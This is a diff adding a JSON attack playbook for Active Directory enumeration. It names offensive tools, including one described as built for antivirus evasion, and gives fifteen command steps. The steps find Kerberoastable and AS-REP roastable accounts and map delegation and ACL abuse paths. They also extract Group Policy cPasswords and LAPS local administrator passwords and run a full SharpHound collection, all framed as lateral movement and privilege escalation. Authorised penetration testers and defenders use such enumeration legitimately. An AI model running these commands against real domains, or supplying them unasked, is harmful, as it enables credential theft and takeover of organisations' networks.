@@ -1,0 +1,118 @@
+{
+  "name": "Active Directory Enumeration",
+  "description": "Comprehensive enumeration of an Active Directory environment to map domain structure, identify high-value targets, misconfigurations, and attack paths for lateral movement or privilege escalation.",
+  "tools": [
+    {
+      "name": "PowerView",
+      "description": "PowerShell tool for AD reconnaissance (legacy but powerful; use on older domains or when SharpView unavailable)",
+      "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    },
+    {
+      "name": "SharpView",
+      "description": "C#/.NET port of PowerView for AV evasion",
+      "url": "https://github.com/tevora-threat/SharpView"
+    },
+    {
+      "name": "BloodHound",
+      "description": "Graph-based AD attack path visualization (requires SharpHound collector)",
+      "url": "https://github.com/BloodHoundAD/BloodHound"
+    },
+    {
+      "name": "ADRecon",
+      "description": "Offline AD data extractor in PowerShell",
+      "url": "https://github.com/adrecon/ADRecon"
+    }
+  ],
+  "steps": [
+    {
+      "index": 1,
+      "name": "Verify Domain Context",
+      "command": "nltest /dsgetdc:%USERDOMAIN%; echo %USERDOMAIN%; echo %USERDNSDOMAIN%; echo %LOGONSERVER%",
+      "description": "Confirm domain membership, PDC emulator, and logon server to ensure you're in the target domain."
+    },
+    {
+      "index": 2,
+      "name": "Current User Domain Privileges",
+      "command": "whoami /groups; net user %USERNAME% /domain; net group \"Domain Admins\" /domain 2>$null",
+      "description": "Check group memberships and confirm if current user has any domain-level privileges."
+    },
+    {
+      "index": 3,
+      "name": "Domain Trusts Enumeration",
+      "command": "nltest /domain_trusts; Get-ADTrust -Filter * -Server (Get-ADDomainController)",
+      "description": "List all trusted domains and trust types (parent-child, forest, external) for cross-domain attack paths."
+    },
+    {
+      "index": 4,
+      "name": "Domain Controllers & FSMO Roles",
+      "command": "netdom query fsmo; nltest /dclist:%USERDOMAIN%; Get-ADDomainController -Filter * | Select Name,IPv4Address,OperatingSystem",
+      "description": "Identify all DCs, their OS, and FSMO role holders (high-value targets)."
+    },
+    {
+      "index": 5,
+      "name": "High-Value Groups & Members",
+      "command": "net group \"Enterprise Admins\" /domain; net group \"Domain Admins\" /domain; net group \"Server Operators\" /domain",
+      "description": "Enumerate members of privileged domain groups (DA, EA, Backup Operators, etc.)."
+    },
+    {
+      "index": 6,
+      "name": "Users with SPNs (Kerberoast Targets)",
+      "command": "setspn -Q */* | findstr -i \"user\"; Get-ADUser -Filter {ServicePrincipalName -ne \\\"$null\\\"} -Properties ServicePrincipalName",
+      "description": "Find user accounts with SPNs for Kerberoasting (especially those with weak encryption)."
+    },
+    {
+      "index": 7,
+      "name": "AS-REP Roastable Users",
+      "command": "Get-ADUser -Filter {UserPrincipalName -like \"*\"} -Properties DoesNotRequirePreAuth | Where {$_.DoesNotRequirePreAuth -eq $true}",
+      "description": "Identify users with 'Do not require Kerberos preauthentication' enabled (AS-REP roastable)."
+    },
+    {
+      "index": 8,
+      "name": "AdminSDHolder & Protected Users",
+      "command": "Get-ADObject \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" -Properties *; Get-ADGroupMember \"Protected Users\" -Recursive",
+      "description": "Check AdminSDHolder permissions and members of Protected Users group (restricted delegation)."
+    },
+    {
+      "index": 9,
+      "name": "Unconstrained Delegation Systems",
+      "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,DNSHostName; Get-ADUser -Filter {TrustedForDelegation -eq $true}",
+      "description": "Find computers/users with unconstrained delegation — prime targets for privilege escalation."
+    },
+    {
+      "index": 10,
+      "name": "Constrained Delegation & S4U",
+      "command": "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \\\"$null\\\"} -Properties msDS-AllowedToDelegateTo,sAMAccountName,userAccountControl",
+      "description": "List accounts with constrained delegation (S4U2Self/S4U2Proxy) for service impersonation attacks."
+    },
+    {
+      "index": 11,
+      "name": "GPO Enumeration & Misconfigurations",
+      "command": "Get-GPO -All | Select DisplayName,Id; Get-GPPPassword 2>$null || echo \"GPP cPasswords disabled\"",
+      "description": "List Group Policy Objects; check for embedded credentials in SYSVOL (Groups.xml)."
+    },
+    {
+      "index": 12,
+      "name": "OU Structure & ACL Abuse",
+      "command": "Get-ADOrganizationalUnit -Filter * -Properties DistinguishedName; Get-Acl \"AD:(OU=Servers,DC=corp,DC=local)\" | ?{$_.ActiveDirectoryRights -match \"WriteDacl|GenericAll\"}",
+      "description": "Map OU hierarchy and find excessive permissions (WriteDACL, FullControl) on OUs."
+    },
+    {
+      "index": 13,
+      "name": "Password Policy & Lockout",
+      "command": "net accounts /domain; Get-ADDefaultDomainPasswordPolicy",
+      "description": "Retrieve domain password policy (complexity, history, min age) and lockout thresholds."
+    },
+    {
+      "index": 14,
+      "name": "LAPS Status (if deployed)",
+      "command": "Get-ADComputer -Filter {ms-Mcs-AdmPwd -ne \\\"$null\\\"} -Properties ms-Mcs-AdmPwd,DNSHostName | Select DNSHostName,ms-Mcs-AdmPwd",
+      "description": "If LAPS is enabled and readable, extract local admin passwords (requires ms-Mcs-AdmPwd read rights)."
+    },
+    {
+      "index": 15,
+      "name": "Collect for BloodHound",
+      "command": "SharpHound.exe -c All --zipfilename bloodhound.zip --domain corp.local",
+      "description": "Run SharpHound to collect full AD dataset for BloodHound ingestion and attack path visualization."
+    }
+  ]
+}
